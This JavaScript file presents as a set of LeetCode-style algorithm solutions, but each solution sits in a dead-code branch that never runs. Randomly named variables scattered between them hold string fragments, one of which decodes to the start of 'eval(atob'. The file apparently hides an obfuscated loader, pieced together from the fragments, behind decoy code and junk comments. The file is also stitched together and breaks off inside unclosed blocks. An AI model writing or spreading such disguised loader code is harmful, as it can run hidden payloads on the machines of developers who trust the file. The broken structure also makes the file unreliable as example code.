    var lcgygbfebtv = 'LJyYhe';
// script loop define hello variable return gkmhqy number return world constant loop constant compile
    var txfwwngtjdyl = 'dwHwsSl';
if ('false' === true) {
    /**
Write an algorithm to determine if a number is "happy".

A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.

Example: 19 is a happy number

12 + 92 = 82
82 + 22 = 68
62 + 82 = 100
12 + 02 + 02 = 1

 * @param {number} n
 * @return {boolean}
 */
var isHappy = function(n) {
    var cur = n,
        num,
        i,
        len,
        result = [],
        sum = 0,
        sums = [];
    while (true) {
        while (cur !== 0) {
            num = cur%10;
            result.push(num);
            cur = (cur - num)/10;
        }
        len = result.length;
        for(i = 0; i < len; i++) {
            sum += Math.pow(result[i], 2);
        }
        if (sum === 1) {
            return true;
        } else {
            if (sums.indexOf(sum) !== -1) {
                return false;
            } else {
                sums.push(sum);
                result = [];
                cur = sum;
                sum = 0;
            }
        }
    }
};

}

(function() {
    var djckercmg = 'ecfeNRUjx';

if (0.64 && false) {
    /**
Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.

Note:
You must not modify the array (assume the array is read only).
You must use only constant, O(1) extra space.
Your runtime complexity should be less than O(n2).
There is only one duplicate number in the array, but it could be repeated more than once.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var findDuplicate = function(nums) {
    var fast = 0,
        slow = 0,
        find = 0;
        
    while (true) {
        fast = nums[nums[fast]];
        slow = nums[slow];
        
        if (fast === slow) {
            break;
        }
    }
    
    while (find !== slow) {
        find = nums[find];
        slow = nums[slow];
    }
    
    return find;
};


// SOLUTION 2
/**
二分法
复杂度
时间 O(NlogN) 空间 O(1)

思路
实际上，我们可以根据抽屉原理简化刚才的暴力法。我们不一定要依次选择数，然后看是否有这个数的重复数，我们可以用二分法先选取n/2，按照抽屉原理，整个数组中如果小于等于n/2的数的数量大于n/2，说明1到n/2这个区间是肯定有重复数字的。比如6个抽屉，如果有7个袜子要放到抽屉里，那肯定有一个抽屉至少两个袜子。这里抽屉就是1到n/2的每一个数，而袜子就是整个数组中小于等于n/2的那些数。这样我们就能知道下次选择的数的范围，如果1到n/2区间内肯定有重复数字，则下次在1到n/2范围内找，否则在n/2到n范围内找。下次找的时候，还是找一半。

注意
我们比较的mid而不是nums[mid]
因为mid是下标，所以判断式应为cnt > mid，最后返回min

代码
public class Solution {
    public int findDuplicate(int[] nums) {
        int min = 0, max = nums.length - 1;
        while(min <= max){
            // 找到中间那个数
            int mid = min + (max - min) / 2;
            int cnt = 0;
            // 计算总数组中有多少个数小于等于中间数
            for(int i = 0; i < nums.length; i++){
                if(nums[i] <= mid){
                    cnt++;
                }
            }
            // 如果小于等于中间数的数量大于中间数，说明前半部分必有重复
            if(cnt > mid){
                max = mid - 1;
            // 否则后半部分必有重复
            } else {
                min = mid + 1;
            }
        }
        return min;
    }
}

*/

}

    var ljqiunnytp = 'sSTebt';
if (typeof document === 'undefined') {
    /**
Given an array of integers, every element appears three times except for one. Find that single one.

Note:
Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var singleNumber = function(nums) {
    var arr = [],
        len = nums.length,
        num,
        cur,
        result = 0,
        i,
        j;
    
    for (i = 0; i < 32; i++) {
        arr[i] = 0;
    }
    
    for (i = 0; i < len; i++) {
        num = nums[i];
        
        cur = num;
        for (j = 0; j < 32; j++) {
            if (cur === 0) {
                break;
            }
            
            arr[j] += (cur & 1);
            
            cur = (cur >> 1);
        }
    }
    
    for (i = 0; i < 32; i++) {
        result += ((arr[i] % 3) << i);
    }
    
    return result;
};

}

    var wegzqcldtzvr = 'ZXZhbChhdG';
if (0.16 && false) {
    // TODO: optimize
/**
 * @param {number} n
 * @return {string[]}
 */
var generateParenthesis = function(n) {
    var i = 1,
        result = [];
    
    if (n === 0) {
        return result;
    }
    
    result.push('()');
    
    while (i < n) {
        result = helper(result);
        i++;
    }
    
    return result;
};

function helper(arr) {
    var len = arr.length,
        result = [],
        len1,
        curStr,
        tmp,
        i,
        j;
        
    len1 = arr[0].length;
    
    for (i = 0; i < len; i++) {
        curStr = arr[i];
        
        for (j = 0; j < len1; j++) {
            tmp = curStr.substring(0, j) + '()' + curStr.substring(j);
            
            if (result.indexOf(tmp) === -1) {
                result.push(tmp);
            }
        }
    }
    
    return result;
}

}

    var mbjrrzet = 'jSbGFIF';
    var qozalusrs = '9iKCJJQ';
if (10 === 16) {
    /**
 Given n nodes labeled from 0 to n - 1 and a list of undirected edges (each edge is a pair of nodes), write a function to check whether these edges make up a valid tree.

For example:

Given n = 5 and edges = [[0, 1], [0, 2], [0, 3], [1, 4]], return true.

Given n = 5 and edges = [[0, 1], [1, 2], [2, 3], [1, 3], [1, 4]], return false.

Hint:

    Given n = 5 and edges = [[0, 1], [1, 2], [3, 4]], what should your return? Is this case a valid tree?
    According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”

Note: you can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges. 
*/
/**
 * @param {number} n
 * @param {number[][]} edges
 * @return {boolean}
 */
var validTree = function(n, edges) {
    let nodes = [];
    
    for (let i = 0; i < n; i++) {
        nodes[i] = i;
    }
    
    for (let i = 0; i < edges.length; i++) {
        let start = edges[i][0];
        let end = edges[i][1];
        
        while (nodes[start] !== start) {
            start = nodes[start];
        }
        
        while (nodes[end] !== end) {
            end = nodes[end];
        }
        
        // cycle detected
        if (start === end) {
            return false;
        }
        
        nodes[start] = end;
    }
    // edges are enough to connect each node
    return edges.length >= n - 1;
};

}

    var gxmzztmfhdi = 'MVSXzh';
    var ollzppzjhgjl = '0F2';
if (0.50 && false) {
    /**
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].

Follow up: What if you are given k 1d vectors? How well can your code be extended to such cases?

Clarification for the follow up question - Update (2015-09-18):
The "Zigzag" order is not clearly defined and is ambiguous for k > 2 cases. If "Zigzag" does not look right to you, replace "Zigzag" with "Cyclic". For example, given the following input:

[1,2,3]
[4,5,6,7]
[8,9]

It should return [1,4,8,2,5,9,3,6,7]. 
*/
/**
 * @constructor
 * @param {Integer[]} v1
 * @param {Integer[]} v1
 */
var ZigzagIterator = function ZigzagIterator(v1, v2) {
    this.arr = arguments;
    this.list = [];
    
    for (let i = 0; i < this.arr.length; i++) {
        if (this.arr[i].length > 0) {
            this.list.push([i, 0]);
        }
    }
    
};


/**
 * @this ZigzagIterator
 * @returns {boolean}
 */
ZigzagIterator.prototype.hasNext = function hasNext() {
    return this.list.length > 0;
};

/**
 * @this ZigzagIterator
 * @returns {integer}
 */
ZigzagIterator.prototype.next = function next() {
    const targetIndex = this.list.shift();
    const val = this.arr[targetIndex[0]][targetIndex[1]];
    
    if (targetIndex[1] < this.arr[targetIndex[0]].length - 1) {
        this.list.push([targetIndex[0], targetIndex[1] + 1]);
    }
    
    return val;
};

/**
 * Your ZigzagIterator will be called like this:
 * var i = new ZigzagIterator(v1, v2), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var ntyjyrjg = 'EsSn';
if (typeof navigator === 'undefined') {
    /**
Given two arrays of length m and n with digits 0-9 representing two numbers. Create the maximum number of length k <= m + n from digits of the two. The relative order of the digits from the same array must be preserved. Return an array of the k digits. You should try to optimize your time and space complexity.

Example 1:
nums1 = [3, 4, 6, 5]
nums2 = [9, 1, 2, 5, 8, 3]
k = 5
return [9, 8, 6, 5, 3]

Example 2:
nums1 = [6, 7]
nums2 = [6, 0, 4]
k = 5
return [6, 7, 6, 0, 4]

Example 3:
nums1 = [3, 9]
nums2 = [8, 9]
k = 3
return [9, 8, 9]
*/

/**
 * @param {number[]} nums1
 * @param {number[]} nums2
 * @param {number} k
 * @return {number[]}
 */
var maxNumber = function(nums1, nums2, k) {
    var len1 = nums1.length,
        len2 = nums2.length,
        arr1,
        arr2,
        arr,
        result,
        i;
    
    for (i = Math.max(0, k - len2); i <= k && i <= len1; i++) {
        arr1 = getMaxSubArr(nums1, i);
        arr2 = getMaxSubArr(nums2, k - i);
        arr = merge(arr1, arr2);
        
        if (!result) {
            result = arr;
        } else {
            result = getGreaterArr(result, arr);
        }
    }
    
    return result;
};

// return max sub array of size m
function getMaxSubArr(arr, m) {
    var result = [],
        len = arr.length,
        i,
        j = 0; // top of the stack
    
    for (i = 0; i < len; i++) {
        while (j > 0 && (m - j < len - i) && (result[j - 1] < arr[i])) { //can pop item out of stack
            j--;
        }
        
        if (j < m) {
            result[j] = arr[i];
            j++;
        }
    }
    
    return result;
}

//TODO: Integrate getGreaterArr into isGreater function
function getGreaterArr(a, b) {
    var len = a.length,
        i = 0;
        
    while (i < len) {
        if (a[i] < b[i]) {
            return b;
        } else if (a[i] > b[i]) {
            return a;
        }
        
        i++;
    }
    
    return a;
}

function isGreater(a, i, b, j) {
    var len1 = a.length,
        len2 = b.length;
    
    while(i < len1 && j < len2 && a[i] === b[j]) {
        i++;
        j++;
    }
    
    if (i === len1) {
        return false;
    }
    
    if (j === len2) {
        return true;
    }
    
    return a[i] > b[j];
}

function merge(a, b) {
    var len1 = a.length,
        len2 = b.length,
        i = 0,
        j = 0,
        result = [];
        
    while(i < len1 && j < len2) {
        if (isGreater(a, i, b, j)) {
            result.push(a[i]);
            i++;
        } else {
            result.push(b[j]);
            j++;
        }
    }
    
    while (i < len1) {
        result.push(a[i++]);
    }
    
    while (j < len2) {
        result.push(b[j++]);
    }
    
    return result;
}

}

// hello import event xynobryh world string debug
if ('true' === true) {
    /**
Implement an iterator to flatten a 2d vector.

For example,
Given 2d vector =

[
  [1,2],
  [3],
  [4,5,6]
]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,2,3,4,5,6].

Hint:

    How many variables do you need to keep track?
    Two variables is all you need. Try with x and y.
    Beware of empty rows. It could be the first few rows.
    To write correct code, think about the invariant to maintain. What is it?
    The invariant is x and y must always point to a valid point in the 2d vector. Should you maintain your invariant ahead of time or right when you need it?
    Not sure? Think about how you would implement hasNext(). Which is more complex?
    Common logic in two different places should be refactored into a common method.

*/
/**
 * @constructor
 * @param {Integer[][]} vec2d
 */
var Vector2D = function(vec2d) {
    this.vec = vec2d;
    this.row = 0;
    this.col = 0;
};


/**
 * @this Vector2D
 * @returns {boolean}
 */
Vector2D.prototype.hasNext = function() {
    if (this.vec.length === 0) {
        return false;
    }
    
    if (this.col === this.vec[this.row].length) {
        this.col = 0;
        this.row++;
    }
    
    while (this.row < this.vec.length && this.vec[this.row].length === 0) {
        this.row++;
    }
    
    if (this.row === this.vec.length) {
        return false;
    }

    return true;
};

/**
 * @this Vector2D
 * @returns {integer}
 */
Vector2D.prototype.next = function() {
    const val = this.vec[this.row][this.col];
    
    this.col++;
    
    return val;
};

/**
 * Your Vector2D will be called like this:
 * var i = new Vector2D(vec2d), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var gfwmkbpoxid = 'VhbDkVCtii';
if ('n' === 'W') {
    /**
An abbreviation of a word follows the form <first letter><number><last letter>. Below are some examples of word abbreviations:

a) it                      --> it    (no abbreviation)

     1
b) d|o|g                   --> d1g

              1    1  1
     1---5----0----5--8
c) i|nternationalizatio|n  --> i18n

              1
     1---5----0
d) l|ocalizatio|n          --> l10n

Assume you have a dictionary and given a word, find whether its abbreviation is unique in the dictionary. A word's abbreviation is unique if no other word from the dictionary has the same abbreviation.

Example:

Given dictionary = [ "deer", "door", "cake", "card" ]

isUnique("dear") -> false
isUnique("cart") -> true
isUnique("cane") -> false
isUnique("make") -> true

*/
/**
 * @constructor
 * @param {string[]} dictionary
 */
var ValidWordAbbr = function(dictionary) {
    this.map = new Map();
    this.getAbbr = function(str) {
        const len = str.length;
        
        if (len <= 2) {
            return str;
        }
        
        return str.charAt(0) + (len - 2) + str.charAt(len - 1);
    };
    
    dictionary.forEach(word => {
        const abbr = this.getAbbr(word);
        
        if (!this.map.has(abbr)) {
            this.map.set(abbr, word);
        } else {
            if (this.map.get(abbr) !== word) {
                this.map.set(abbr, '');
            }
        }
    });
};

/**
 * @param {string} word
 * @return {bool}
 */
ValidWordAbbr.prototype.isUnique = function(word) {
    const abbr = this.getAbbr(word);
    
    return !this.map.has(abbr) || this.map.get(abbr) === word;
};


/**
 * Your ValidWordAbbr object will be instantiated and called as such:
 * var vwa = new ValidWordAbbr(dictionary);
 * vwa.isUnique("word");
 * vwa.isUnique("anotherWord");
 */

}

    var ztqamxrqjh = 'THlCRWFY';
    var kmqtkzqf = 'TScNE';
if (typeof window === 'undefined') {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var seymxqzao = 'TmhZbX';
    var gcfjdi = 'AxsIGlsyj';
    var qgtoin = 'hsY';
    var obejytxlyaat = 'YcYnUrH';
    var tvvrcwey = '3lCemNHVm';
if (null === 0) {
    /**
Given a linked list, remove the nth node from the end of list and return its head.

For example,

   Given linked list: 1->2->3->4->5, and n = 2.

   After removing the second node from the end, the linked list becomes 1->2->3->5.
Note:
Given n will always be valid.
Try to do this in one pass.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} n
 * @return {ListNode}
 */
var removeNthFromEnd = function(head, n) {
    var nodeA = head,
        nodeB = head,
        i = 0;
    
    if (!head) {
        return null;
    }
    
    while (nodeA.next) {
        nodeA = nodeA.next;
        if (i < n) {
            i++;
        } else {
            nodeB = nodeB.next;
        }
    }
    
    if (i < n) {
        head = head.next;
        return head;
    }
    
    if (nodeB.next) {
        nodeB.next = nodeB.next.next;
        return head;
    }
    
    return null;
      
};

}

    var dvsgbsdo = 'TTxP';
if (7 === 17) {
    /**
Given a binary search tree, write a function kthSmallest to find the kth smallest element in it.

Note: 
You may assume k is always valid, 1 ≤ k ≤ BST's total elements.

Follow up:
What if the BST is modified (insert/delete operations) often and you need to find the kth smallest frequently? How would you optimize the kthSmallest routine?

Hint:

Try to utilize the property of a BST.
What if you could modify the BST node's structure?
The optimal runtime complexity is O(height of BST).
*/

// SOLUTION 1
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    var node = root,
        stack = [],
        count = 0,
        right;
    
    while (node) {
        stack.push(node);
        node = node.left;
    }
    
    while (stack.length > 0) {
        node = stack.pop();
        count++;
        
        if (k === count) {
            return node.val;
        }
        
        right = node.right;
        
        while (right) {
            stack.push(right);
            right = right.left;
        }
    }
    
    return null;
};


// SOLUTION 2

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    var leftSums = findNodesSum(root.left);
    
    if (leftSums + 1 === k) {
        return root.val;
    }
    
    if (leftSums + 1 < k) {
        return kthSmallest(root.right, k - leftSums - 1);
    }
    
    return kthSmallest(root.left, k);
};

function findNodesSum(root) {
    if (!root) {
        return 0;
    }
    
    return findNodesSum(root.left) + findNodesSum(root.right) + 1;
}

// SOLUTION 3: with modifying property
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} k
 * @return {number}
 */
var kthSmallest = function(root, k) {
    addCountToNode(root);
    
    return findKth(root, k);
};

function addCountToNode(root) {
    if (!root) {
        return null;
    }
    
    root.count = 1;
    let left = addCountToNode(root.left);
    let right = addCountToNode(root.right);
    
    if (left) {
        root.count += left.count;
    }
    
    if (right) {
        root.count += right.count;
    }
    
    return root;
}

function findKth(root, k) {
    if (!root) {
        return;
    } 
    
    let leftCount;
    
    if (!root.left) {
        leftCount = 0;    
    } else {
        leftCount = root.left.count;
    }
    
    if (leftCount === k - 1) {
        return root.val;
    }
    
    if (leftCount > k - 1) {
        return findKth(root.left, k);
    }
    
    let newCount = k - 1 - leftCount;
    
    return findKth(root.right, newCount);
}

}

// async value function script glrcsvm object code number
    var onmflgzeh = 'xZvDS';
    var epzjcprzquhk = 'phV';
    var xdfzwrrj = 'AonMuMpq';
if (9 === 19) {
    /**
An abbreviation of a word follows the form <first letter><number><last letter>. Below are some examples of word abbreviations:

a) it                      --> it    (no abbreviation)

     1
b) d|o|g                   --> d1g

              1    1  1
     1---5----0----5--8
c) i|nternationalizatio|n  --> i18n

              1
     1---5----0
d) l|ocalizatio|n          --> l10n

Assume you have a dictionary and given a word, find whether its abbreviation is unique in the dictionary. A word's abbreviation is unique if no other word from the dictionary has the same abbreviation.

Example:

Given dictionary = [ "deer", "door", "cake", "card" ]

isUnique("dear") -> false
isUnique("cart") -> true
isUnique("cane") -> false
isUnique("make") -> true

*/
/**
 * @constructor
 * @param {string[]} dictionary
 */
var ValidWordAbbr = function(dictionary) {
    this.map = new Map();
    this.getAbbr = function(str) {
        const len = str.length;
        
        if (len <= 2) {
            return str;
        }
        
        return str.charAt(0) + (len - 2) + str.charAt(len - 1);
    };
    
    dictionary.forEach(word => {
        const abbr = this.getAbbr(word);
        
        if (!this.map.has(abbr)) {
            this.map.set(abbr, word);
        } else {
            if (this.map.get(abbr) !== word) {
                this.map.set(abbr, '');
            }
        }
    });
};

/**
 * @param {string} word
 * @return {bool}
 */
ValidWordAbbr.prototype.isUnique = function(word) {
    const abbr = this.getAbbr(word);
    
    return !this.map.has(abbr) || this.map.get(abbr) === word;
};


/**
 * Your ValidWordAbbr object will be instantiated and called as such:
 * var vwa = new ValidWordAbbr(dictionary);
 * vwa.isUnique("word");
 * vwa.isUnique("anotherWord");
 */

}

// event async script value debug await woguhcit nucuanp debug
    var bzoifens = 'xqSFIFJz';
    var wukcn = '1pwWXlC';
    var usswahxtepsc = 'JoufvQPB';
    var tbkpayg = 'clpYbGl';
    var gpbkgms = 'OyLHRj';
    var xmnvoi = 'iMkZ5WkNCe';
    var jlslzsswn = 'ysPSfDcRcz';
    var mvtkiwzpfkucpwd = 'mFHOXlkR';
    var rmoubiuumndp = 'gmfnGz';
    var upmvlza = '04xZEhN';
if (Array.isArray(10)) {
    /**
Median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle value.

Examples: 
[2,3,4] , the median is 3

[2,3], the median is (2 + 3) / 2 = 2.5

Design a data structure that supports the following two operations:

void addNum(int num) - Add a integer number from the data stream to the data structure.
double findMedian() - Return the median of all elements so far.
For example:

add(1)
add(2)
findMedian() -> 1.5
add(3) 
findMedian() -> 2
*/

// SOLUTION 1: use a max heap and min heap
// java solution
/**
class MedianFinder {

    private Queue<Long> small = new PriorityQueue(),
                        large = new PriorityQueue();

    public void addNum(int num) {
        large.add((long) num);
        small.add(-large.poll());
        if (large.size() < small.size())
            large.add(-small.poll());
    }

    public double findMedian() {
        return large.size() > small.size()
               ? large.peek()
               : (large.peek() - small.peek()) / 2.0;
    }
};
*/

// SOLUTION 2: BST
/**
 * My BST node, has extra attribute initialized as 0
 */
class BSTNode {
    constructor (val) {
        this.val = val;
        this.left = null;
        this.right = null;
        this.size = 1;
    }
}

class BST {
    constructor() {
        this.root = null;
    }
    
    add(val, node) {
        if (!node) {
            this.root = new BSTNode(val);
            return;
        }
        
        if (val > node.val) {
            if (node.right) {
                this.add(val, node.right);
            } else {
                node.right = new BSTNode(val);
            }
        } else {
            if (node.left) {
                this.add(val, node.left);
            } else {
                node.left = new BSTNode(val);
            }
        }
        
        node.size++;
    }
    
    rank(k) {
        let node = this.root;
        
        while(true) {
            const leftSize = node.left ? node.left.size : 0;
            
            if (leftSize === k) {
                return node.val;
            }
            
            if (leftSize > k) {
                node = node.left;
            } else {
                node = node.right;
                k = k - leftSize - 1;
            }
        }
    }
}

/**
 * @constructor
 */
var MedianFinder = function() {
    this.BST = new BST();
};

/**
 * @param {integer} word
 * @return {void}
 * Adds a num into the data structure.
 */
MedianFinder.prototype.addNum = function(num) {
    this.BST.add(num, this.BST.root);
};

/**
 * @return {double}
 * Return median of current data stream
 */
MedianFinder.prototype.findMedian = function() {
    const size = this.BST.root.size;
    
    if (size % 2 === 0) {
        return (this.BST.rank(size / 2) + this.BST.rank(size / 2 - 1)) / 2;
    }
    
    return this.BST.rank(parseInt(size / 2));
};

/**
 * Your MedianFinder object will be instantiated and called as such:
 * var mf = new MedianFinder();
 * mf.addNum(1);
 * mf.findMedian();
 */

}

    var yrifhkge = 'pdlmQVf';
    var natfdjtnehckdm = 'Z2RIbHd';
if ('x' === 'J') {
    /**
Remove all elements from a linked list of integers that have value val.

Example
Given: 1 --> 2 --> 6 --> 3 --> 4 --> 5 --> 6, val = 6
Return: 1 --> 2 --> 3 --> 4 --> 5

Credits:
Special thanks to @mithmatt for adding this problem and creating all test cases.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} val
 * @return {ListNode}
 */
var removeElements = function(head, val) {
    var dummyNode = new ListNode(null),
        node;
    
    if (val === null) {
        return head;
    }
    
    dummyNode.next = head;
    node = dummyNode;
    
    while (node.next) {
        if (node.next.val === val) {
            node.next = node.next.next;
        } else {
            node = node.next;
        }
    }
    
    return dummyNode.next;
};

}

    var gdzxdf = 'zZpDBp';
    var zwzowqhty = 'hV05oYkd4N';
if (typeof document === 'undefined') {
    /**

Given a binary tree, return the preorder traversal of its nodes' values.

For example:
Given binary tree {1,#,2,3},
   1
    \
     2
    /
   3
return [1,2,3].

Note: Recursive solution is trivial, could you do it iteratively

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} root
 * @returns {number[]}
 */
var preorderTraversal = function(root) {
    var store = [],
        result = [],
        cur;
    if (root === null) {
        return store;
    }
    store.push(root);
    while(store.length > 0) {
        cur = store.pop();
        result.push(cur.val);
        if (cur.right) {
            store.push(cur.right);
        }
        if (cur.left) {
            store.push(cur.left);
        }
    }
    return result;
};

}

    var cxfhyn = 'VImy';
if (80 > 145) {
    /**
Additive number is a string whose digits can form additive sequence.

A valid additive sequence should contain at least three numbers. Except for the first two numbers, each subsequent number in the sequence must be the sum of the preceding two.

For example:
"112358" is an additive number because the digits can form an additive sequence: 1, 1, 2, 3, 5, 8.

1 + 1 = 2, 1 + 2 = 3, 2 + 3 = 5, 3 + 5 = 8
"199100199" is also an additive number, the additive sequence is: 1, 99, 100, 199.
1 + 99 = 100, 99 + 100 = 199
Note: Numbers in the additive sequence cannot have leading zeros, so sequence 1, 2, 03 or 1, 02, 3 is invalid.

Given a string containing only digits '0'-'9', write a function to determine if it's an additive number.

Follow up:
How would you handle overflow for very large input integers?
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isAdditiveNumber = function(num) {
    var len = num.length,
        i,
        j;
        
    for (i = 1; i <= len / 2; i++) {
        for (j = 1; j <= len / 2; j++) {
            if (canBeAdded(num.substr(0, i), num.substr(i, j), num.substr(i + j))) {
                return true;
            }
        }
    }
    
    return false;
};

function canBeAdded(a, b, c) {
    if ((a.length > 1 && a.charAt(0) === '0') || (b.length > 1 && b.charAt(0) === '0') || (c.length >= 1 && c.charAt(0) === '0')) {
        return false;
    }
    
    var aNum = parseInt(a),
        bNum = parseInt(b),
        sum = aNum + bNum + '';
        
    if (c === sum) {
        return true;
    }
    
    if (c.substr(0, sum.length) !== sum) {
        return false;
    }
    
    return canBeAdded(b, sum, c.substr(sum.length));
}

}

// object variable string array event kdxlzhot string loop lbldg define function string
    var fagdkq = 'uTHLCSxFS';
    var ksiahrmkb = 'UlIVnpaV';
if (70 > 163) {
    /**
Given an array nums, write a function to move all 0's to the end of it while maintaining the relative order of the non-zero elements.

For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].

Note:
You must do this in-place without making a copy of the array.
Minimize the total number of operations.
*/

/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var moveZeroes = function(nums) {
    var len = nums.length,
        curIndex = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === 0) {
            continue;
        }
        
        nums[curIndex] = nums[i];
        curIndex++;
    }
    
    for (i = curIndex; i < len; i++) {
        nums[i] = 0;
    }
};

}

    var ehlapauo = 'OadFvLfIh';
    var cmdxpsnerbacl = '1Fn';
if (typeof navigator === 'undefined') {
    /**
Given a 2D board containing 'X' and 'O', capture all regions surrounded by 'X'.

A region is captured by flipping all 'O's into 'X's in that surrounded region.

For example,
X X X X
X O O X
X X O X
X O X X
After running your function, the board should be:

X X X X
X X X X
X X X X
X O X X
*/

/**
 * @param {character[][]} board
 * @return {void} Do not return anything, modify board in-place instead.
 */
var solve = function(board) {
    if (board === null) {
        return;
    }
    
    var rowL = board.length,
        columnL,
        i,
        j;
    
    if (rowL <= 1) {
        return;
    }
    
    columnL = board[0].length;
    
    // visit borders
    for (i = 0; i < rowL; i++) {
        visit(board, i, 0, rowL, columnL);
        visit(board, i, columnL - 1, rowL, columnL);
    }
    
    // visit borders
    for (i = 1; i < columnL - 1; i++) {
        visit(board, 0, i, rowL, columnL);
        visit(board, rowL - 1, i, rowL, columnL);
    }
    
    // flip all 'O' to 'X' and flip all 'Y' to 'O'
    for (i = 0; i < rowL; i++) {
        for (j = 0; j <columnL; j++) {
            if (board[i][j] === 'O') {
                board[i][j] = 'X';
            } else if (board[i][j] === 'Y') {
                board[i][j] = 'O';
            }
        }
    }
};

// flip connected 0 to 'Y'
function visit(board, i, j, rowL, columnL) {
    if (i < 0 || j < 0 || i >= rowL || j >= columnL || board[i][j] !== 'O') {
        return;
    }
    
    var queue = [],
        cur,
        row,
        column;
    
    board[i][j] = 'Y';
    queue.push(i * columnL + j);
    
    while(queue.length > 0) {
        cur = queue.pop();
        row = Math.floor(cur / columnL);
        column = cur % columnL;
        
        if (row > 0 && board[row - 1][column] === 'O') {
            queue.push((row - 1)*columnL + column);
            board[row - 1][column] = 'Y';
        }
        
        if (row < rowL -1 && board[row + 1][column] === 'O') {
            queue.push((row + 1)*columnL + column);
            board[row + 1][column] = 'Y';
        }
        
        if (column > 0 && board[row][column - 1] === 'O') {
            queue.push(row * columnL + column - 1);
            board[row][column - 1] = 'Y';
        }
        
        if (column < columnL - 1 && board[row][column + 1] === 'O') {
            queue.push(row * columnL + column + 1);
            board[row][column + 1] = 'Y';
        }
    }
} 

}

    var ygqinhjhqqlv = 'Xqqd';
// export object async object variable script
if (7 instanceof String) {
    /**
Given an unsorted array, find the maximum difference between the successive elements in its sorted form.

Try to solve it in linear time/space.

Return 0 if the array contains less than 2 elements.

You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var maximumGap = function(nums) {
    var length = nums.length,
        bucket = [],
        max = Number.MIN_VALUE,
        min = Number.MAX_VALUE,
        gap = 0,
        bLen,
        bIndex,
        prev,
        i;
        
    if (length < 2) {
        return 0;
    }
    
    for (i = 0; i < length; i++) {
        if (nums[i] > max) {
            max = nums[i];
        }
        
        if (nums[i] < min) {
            min = nums[i];
        } 
    }
    
    // length of each bucket
    bLen = Math.floor((max - min) / length) + 1;
    
    for (i = 0; i < length; i++) {
        bIndex = Math.floor((nums[i] - min) / bLen);
        
        if (!bucket[bIndex]) {
            bucket[bIndex] = [];
            bucket[bIndex].push(nums[i]);
            bucket[bIndex].push(nums[i]);
        } else {
            if (nums[i] < bucket[bIndex][0]) {
                bucket[bIndex][0] = nums[i];
            } else if (nums[i] > bucket[bIndex][1]) {
                bucket[bIndex][1] = nums[i];
            }
        }
    }
    
    length = bucket.length;
    prev = 0;
    
    for (i = 1; i < length; i++) {
        if (!bucket[i]) {
            continue;
        }
        
        gap = Math.max(gap, bucket[i][0] - bucket[prev][1]);
        prev = i;
    }
    
    return gap;
};

}

    var umzewddlvbt = 'NTjeZAFOw';
if (!true && 0) {
    /**
